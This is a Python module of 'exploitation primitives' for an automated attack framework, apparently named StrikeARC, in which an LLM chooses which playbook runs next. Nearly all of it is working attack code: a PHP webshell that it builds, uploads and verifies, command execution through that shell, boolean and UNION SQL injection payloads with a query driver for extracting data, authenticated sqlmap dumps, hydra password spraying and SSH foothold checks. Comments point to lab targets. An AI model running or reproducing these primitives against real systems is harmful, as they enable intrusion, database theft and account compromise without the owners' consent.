"""StrikeARC v9 — Exploitation primitives (deterministic, verified).

Each primitive is a pure-ish function returning a typed result. Design
rules (docs/V9_DESIGN.md §3):
  1. No silent HTTP-200 "success" — every primitive has an explicit
     success criterion (marker / nonce round-trip / parsed structure).
  2. Failures raise or return None — callers treat None as hard failure.
  3. Stable log tags [PRIM:name] for post-run diffing.

The v8 lesson (runs 15-19): LLM-written one-shot commands converted
0% of identified attack chains into footholds. Mechanics live here now;
the LLM only decides WHICH playbook fires next.
"""

from __future__ import annotations

import os
import re
import html
import secrets
import subprocess
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

import requests

from tools.webshell_transport import WebshellTransport

TAG = "[PRIM:{}]"
_TIMEOUT = 20


def _log(name: str, msg: str) -> None:
    print(f"  {TAG.format(name)} {msg}")


class PrimitiveError(Exception):
    """Hard primitive failure — never swallow, never map to success."""


@dataclass
class HTTPSession:
    """Authenticated web session (cookie jar + base URL + optional vhost)."""

    base: str
    cookies: Dict[str, str] = field(default_factory=dict)
    vhost: Optional[str] = None  # Host header override for vhost-routed apps

    def _url(self, path: str) -> str:
        return path if path.startswith("http") else f"{self.base}/{path.lstrip('/')}"

    def _headers(self, extra=None):
        h = {}
        if self.vhost:
            h["Host"] = self.vhost
        if extra:
            h.update(extra)
        return h

    def get(self, path: str, timeout: int = _TIMEOUT, **kw):
        kw.setdefault("headers", self._headers())
        return requests.get(self._url(path), cookies=self.cookies, timeout=timeout, **kw)

    def post(self, path: str, data=None, timeout: int = _TIMEOUT, **kw):
        kw.setdefault("headers", self._headers())
        return requests.post(self._url(path), cookies=self.cookies, data=data, timeout=timeout, **kw)


# ─── Nonce-verified webshell execution ───────────────────────────────


def make_nonce() -> str:
    return f"strikearc_{secrets.token_hex(4)}"


def exec_webshell(url: str, cmd: str, param: str = "c", timeout: int = 15,
                   vhost: Optional[str] = None) -> Optional[str]:
    """Execute cmd via GET-param webshell; nonce-verify nothing.

    Returns stdout-like text or None. The VERIFICATION lives in
    verify_webshell() — raw exec is for already-verified transports.
    """
    try:
        headers = {"Host": vhost} if vhost else None
        r = requests.get(url, params={param: cmd}, headers=headers, timeout=timeout)
        if r.status_code != 200:
            return None
        return r.text
    except requests.RequestException as e:
        _log("exec_webshell", f"request failed: {e.__class__.__name__}")
        return None


def verify_webshell(url: str, param: str = "c", vhost: Optional[str] = None) -> bool:
    """A shell is real only when a nonce command round-trips (v9 §2.1)."""
    nonce = make_nonce()
    out = exec_webshell(url, f"echo {nonce}", param=param, vhost=vhost)
    ok = bool(out and nonce in out)
    _log("verify_webshell", f"{'VERIFIED' if ok else 'DEAD'} {url}")
    return ok


def build_webshell_session(url: str, param: str = "c",
                            vhost: Optional[str] = None) -> Optional[WebshellTransport]:
    """Verify then wrap — returns None unless the nonce round-trips."""
    if not verify_webshell(url, param=param, vhost=vhost):
        return None
    return WebshellTransport(url, param=param)


# ─── HTTP login (marker-verified) ────────────────────────────────────


def http_login(
    base: str,
    login_path: str,
    fields: Dict[str, str],
    success_marker: str,
    fail_marker: Optional[str] = None,
    timeout: int = _TIMEOUT,
) -> Optional[HTTPSession]:
    """POST credentials; success requires the success_marker in body.

    v8 lesson: status-200 logins that were actually login-page re-renders
    created phantom authenticated sessions. Explicit marker only.
    """
    url = f"{base}/{login_path.lstrip('/')}"
    try:
        s = requests.Session()
        r = s.post(url, data=fields, timeout=timeout, allow_redirects=False)
        body = r.text or ""
        if fail_marker and fail_marker in body:
            _log("http_login", f"fail_marker hit at {login_path}")
            return None
        if success_marker and success_marker not in body:
            _allow = r.status_code in (301, 302) and success_marker == ""
            if not _allow:
                _log("http_login", f"no success_marker at {login_path} (status {r.status_code})")
                return None
        sess = HTTPSession(base=base, cookies=s.cookies.get_dict())
        _log("http_login", f"authenticated {login_path} ({len(sess.cookies)} cookies)")
        return sess
    except requests.RequestException as e:
        _log("http_login", f"request failed: {e.__class__.__name__}")
        return None


# ─── SQLi (authenticated, dump-verified) ─────────────────────────────

SQLMAP_TIMEOUT = 600  # lab-scale cap for full --dump runs


def sqli_test(base: str, path: str, params: Dict[str, str], session: Optional[HTTPSession] = None) -> bool:
    """Boolean-based quick probe: append ' OR 1=1-- - and compare.

    Cheap sanity check before committing to a full sqlmap run.
    """
    url = f"{base}/{path.lstrip('/')}"
    try:
        normal = _sqli_get(url, params, session)
        if normal is None:
            return False
        p2 = dict(params)
        first = next(iter(params))
        p2[first] = f"{params[first]}' OR 1=1-- -"
        injected = _sqli_get(url, p2, session)
        ok = injected is not None and abs(len(injected) - len(normal)) > 40
        _log("sqli_test", f"{'CONFIRMED' if ok else 'no signal'} at {path} ({first})")
        return ok
    except Exception as e:
        _log("sqli_test", f"error: {e.__class__.__name__}")
        return False


def _sqli_get(url, params, session: Optional[HTTPSession]):
    if session is not None:
        r = session.get(url, params=params)
    else:
        r = requests.get(url, params=params, timeout=_TIMEOUT)
    if r.status_code != 200:
        return None
    return r.text


def sqli_dump(
    base: str,
    path: str,
    params: Dict[str, str],
    session: Optional[HTTPSession] = None,
    db: Optional[str] = None,
) -> List[Dict[str, str]]:
    """Authenticated sqlmap --dump via cookie injection (v8.3.4 logic,
    now primitive). Returns parsed rows; [] on failure.

    v8 lesson: sqlmap against ticket.php bounced to login because the
    curl-jar PHPSESSID was never chained. Sessions chain here.
    """
    cmd = [
        "sqlmap", "-u", _with_params(base, path, params),
        "--batch", "--dump", "--threads", "4",
        "--timeout", "15", "--retries", "2",
    ]
    if db:
        cmd += ["-D", db]
    if session is not None and session.cookies:
        jar = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
        cmd += ["--cookie", jar]
    _log("sqli_dump", f"sqlmap {'(authenticated)' if session and session.cookies else '(anon)'} on {path}")
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=SQLMAP_TIMEOUT).stdout
    except FileNotFoundError:
        _log("sqli_dump", "sqlmap not installed")
        return []
    except subprocess.TimeoutExpired:
        _log("sqli_dump", "sqlmap timeout")
        return []
    return parse_sqlmap_rows(out)


def parse_sqlmap_rows(out: str) -> List[Dict[str, str]]:
    """Parse '| 1 | admin | P@ss |' table rows into dicts (header row wins)."""
    rows: List[List[str]] = []
    for line in out.splitlines():
        line = line.strip()
        if not (line.startswith("|") and line.endswith("|")):
            continue
        cells = [c.strip() for c in line.strip("|").split("|")]
        if not cells or cells == [""] :
            continue
        if all(re.fullmatch(r"-{2,}", c) for c in cells):  # separator
            continue
        rows.append(cells)
    # scan for header-sep-data pattern
    tables: List[tuple] = []
    i = 0
    while i < len(rows) - 2:
        if all(re.fullmatch(r"-{2,}", c) for c in rows[i + 1]):
            header = rows[i]
            data = []
            j = i + 2
            while j < len(rows) and not all(re.fullmatch(r"-{2,}", c) for c in rows[j]):
                data.append(rows[j])
                j += 1
            tables.append((header, data))
            i = j
        else:
            i += 1
    result = []
    for header, data in tables:
        for d in data:
            if len(d) == len(header):
                result.append({h: v for h, v in zip(header, d)})
    return result


def _with_params(base: str, path: str, params: Dict[str, str]) -> str:
    from urllib.parse import urlencode

    return f"{base}/{path.lstrip('/')}?{urlencode(params)}"


# ─── UNION SQLi via search-style forms (v9.1) ────────────────────────


def union_sqli_search(
    url: str,
    field: str,
    vhost: Optional[str] = None,
    method: str = "POST",
    timeout: int = _TIMEOUT,
) -> Optional["UnionSQLi"]:
    """Detect + wrap a LIKE-style UNION SQLi in a search form.

    Technique validated live against status.inlanefreight.local (run-20
    manual chain): apps that echo their query under ?debug=true disclose
    the injection context. We probe with a canonical UNION row and look
    for our marker rendered in the result table.

    Returns a UnionSQLi driver or None. The driver's queries are
    deterministic — no sqlmap, no LLM command strings.
    """
    probe_col = "strikearc_probe"
    weak_hits = []
    for ncols in (4, 5, 3, 6, 2):  # 4 first — most common in the wild
        for rcol in range(1, ncols + 1):
            # place the probe in EVERY position — the page may render only
            # some columns (status vhost renders cols 2-4, live lesson)
            cols = ["NULL"] * ncols
            cols[rcol - 1] = f"'{probe_col}'"
            payload = f"' UNION SELECT {','.join(cols)}-- -"
            body = _sqli_form_post(url, field, payload, vhost, method, timeout)
            dcol = _locate_cell(body, probe_col)
            if dcol:
                u = UnionSQLi(url=url, field=field, ncols=ncols, rcol=rcol,
                              dcol=dcol, vhost=vhost, method=method, timeout=timeout)
                _log("union_sqli_search",
                     f"CONFIRMED UNION SQLi at {url} ({ncols} cols, "
                     f"payload col {rcol} renders at cell {dcol})")
                return u
            # also accept the probe echoed in the debug div (column context
            # disclosure) but only as a weaker signal if no table render
            if body and probe_col in body and ncols == 4 and rcol == 1:
                weak_hits.append(body)
    _log("union_sqli_search", f"no UNION signal at {url}")
    return None


def _sqli_form_post(url, field, payload, vhost, method, timeout):
    headers = {"Host": vhost} if vhost else {}
    try:
        if method.upper() == "GET":
            r = requests.get(url, params={field: payload, "debug": "true"},
                             headers=headers, timeout=timeout)
        else:
            data = {field: payload}
            full = url if "debug=true" in url else url + "?debug=true"
            r = requests.post(full, data=data, headers=headers, timeout=timeout)
        if r.status_code != 200:
            return None
        return r.text
    except requests.RequestException as e:
        _log("_sqli_form_post", f"request failed: {e.__class__.__name__}")
        return None


class UnionSQLi:
    """Deterministic UNION-SQLi query driver.

    The first selected column renders into the page's result table;
    remaining columns are NULL filler. query() returns the first cell.
    """

    def __init__(self, url, field, ncols, rcol=1, dcol=1, vhost=None,
                 method="POST", timeout=_TIMEOUT):
        self.url = url
        self.field = field
        self.ncols = ncols
        self.rcol = rcol  # 1-based payload position carrying the SQL
        self.dcol = dcol  # 1-based display cell position where it renders
        self.vhost = vhost
        self.method = method
        self.timeout = timeout

    def _payload(self, sql: str) -> str:
        # sql is "expr FROM ..." — the FROM clause must trail the whole
        # select list, not sit inside it (live lesson: mid-list FROM is
        # a syntax error and renders zero rows).
        parts = sql.split(" FROM ", 1)
        expr = parts[0]
        from_clause = (" FROM " + parts[1]) if len(parts) == 2 else ""
        cols = ["NULL"] * self.ncols
        cols[self.rcol - 1] = expr
        return f"' UNION SELECT {','.join(cols)}{from_clause}-- -"

    def query(self, sql: str) -> str:
        body = _sqli_form_post(self.url, self.field, self._payload(sql),
                               self.vhost, self.method, self.timeout)
        cells = _extract_result_cells(body, rcol=self.dcol)
        return cells[0] if cells else ""

    def rows(self, sql: str) -> List[str]:
        body = _sqli_form_post(self.url, self.field, self._payload(sql),
                               self.vhost, self.method, self.timeout)
        return _extract_result_cells(body, rcol=self.dcol)


def _locate_cell(body: str, needle: str) -> int:
    """Return the 1-based display-cell position containing needle, else 0."""
    if not body:
        return 0
    m = re.search(r"searchheader.*?</tr>(.*?)</table>", body, re.S)
    if not m:
        m = re.search(r"</thead>(.*?)</table>", body, re.S)
    if not m:
        return 0
    for tr in re.findall(r"<tr[^>]*>(.*?)</tr>", m.group(1), re.S):
        tds = re.findall(r"<td[^>]*>(.*?)</td>", tr, re.S)
        for i, td in enumerate(tds):
            if needle in html.unescape(td):
                return i + 1
    return 0


def _extract_result_cells_text(body: str) -> str:
    return " ".join(_extract_result_cells(body))


def _extract_result_cells(body: str, rcol: int = 1) -> List[str]:
    """Pull rendered result cells: the rcol-th <td> of each row after the
    header (status vhost renders cols 2-4; col 1 never displays)."""
    if not body:
        return []
    m = re.search(r"searchheader.*?</tr>(.*?)</table>", body, re.S)
    if not m:
        m = re.search(r"</thead>(.*?)</table>", body, re.S)
    if not m:
        return []
    out = []
    for tr in re.findall(r"<tr[^>]*>(.*?)</tr>", m.group(1), re.S):
        tds = re.findall(r"<td[^>]*>(.*?)</td>", tr, re.S)
        if len(tds) >= rcol:
            out.append(html.unescape(tds[rcol - 1]).strip())
    return out


# ─── Upload (URL-verified) ────────────────────────────────────────────


# ─── Upload (URL-verified) ────────────────────────────────────────────



def upload_file(
    session: HTTPSession,
    upload_path: str,
    field: str,
    content: bytes,
    name: str = "shell.php",
    param_name: str = "c",
) -> Optional[str]:
    """Upload via multipart POST; return the shell URL if it verifies.

    The URL is found by probing common upload dirs (uploads/, files/,
    img/, up/); verification is the nonce round-trip — not a 200.
    """
    nonce = make_nonce()
    shell = (
        f"<?php if(isset($_GET['{param_name}'])){{ system($_GET['{param_name}']); }} "
        f"/* {nonce} */ ?>"
    ).encode()
    payload = content if content else shell
    try:
        r = session.post(
            upload_path,
            files={field: (name, payload, "application/x-php")},
            timeout=_TIMEOUT,
        )
        body = r.text or ""
        if r.status_code != 200 or ("error" in body.lower() and "success" not in body.lower()):
            _log("upload_file", f"upload POST rejected (status {r.status_code})")
            return None
    except Exception as e:
        _log("upload_file", f"upload failed: {e.__class__.__name__}")
        return None
    # Probe upload locations
    for d in ("uploads", "upload", "files", "img", "up", "images", "assets"):
        cand = f"{session.base}/{d}/{name}"
        if verify_webshell(cand, param=param_name):
            _log("upload_file", f"shell VERIFIED at {cand}")
            return cand
    _log("upload_file", "uploaded but no verified shell URL found")
    return None


# ─── Cred spray (validated-only) ──────────────────────────────────────


def spray_creds(ip: str, service: str, cred_pairs: List[tuple]) -> List[Dict]:
    """Spray (user, pass) pairs at one service via hydra subprocess.

    Returns only VALIDATED hits. v8 lesson: hydra exit-0 was booked as
    'webshell session' — here a hit is a dict or nothing.
    """
    users = sorted({u for u, _ in cred_pairs})
    passes = sorted({p for _, p in cred_pairs})
    tfile_users = f"/tmp/strikearc_users_{secrets.token_hex(3)}.txt"
    tfile_pass = f"/tmp/strikearc_pass_{secrets.token_hex(3)}.txt"
    with open(tfile_users, "w") as f:
        f.write("\n".join(users))
    with open(tfile_pass, "w") as f:
        f.write("\n".join(passes))
    cmd = [
        "hydra", "-L", tfile_users, "-P", tfile_pass, "-t", "8", "-f",
        ip, service,
    ]
    _log("spray_creds", f"hydra {service}://{ip} ({len(users)}u x {len(passes)}p)")
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=300).stdout
    except FileNotFoundError:
        _log("spray_creds", "hydra not installed")
        return []
    except subprocess.TimeoutExpired:
        _log("spray_creds", "hydra timeout")
        return []
    finally:
        for t in (tfile_users, tfile_pass):
            try:
                os.unlink(t)
            except OSError:
                pass
    hits = []
    for m in re.finditer(r"\[(\d+)\]\[(\w+) host: ([^\s]+) login: ([^\s]+) password: ([^\s]+)", out):
        port, proto, host, login, password = m.groups()
        hits.append({"host": host, "port": int(port), "service": service, "login": login, "password": password})
    _log("spray_creds", f"{len(hits)} validated hit(s)")
    return hits


def ssh_connect(ip: str, user: str, password: str, port: int = 22):
    """Verified SSH foothold — returns SSHCredTransport or None."""
    try:
        from tools.ssh_transport import SSHCredTransport
    except ImportError:
        _log("ssh_connect", "ssh_transport unavailable")
        return None
    try:
        t = SSHCredTransport(ip, user, password, port=port)
        if t.alive():
            _log("ssh_connect", f"VERIFIED {user}@{ip}:{port}")
            return t
    except Exception as e:
        _log("ssh_connect", f"{e.__class__.__name__}: {e}")
        return None
    _log("ssh_connect", f"auth or reachability failed for {user}@{ip}")
    return None
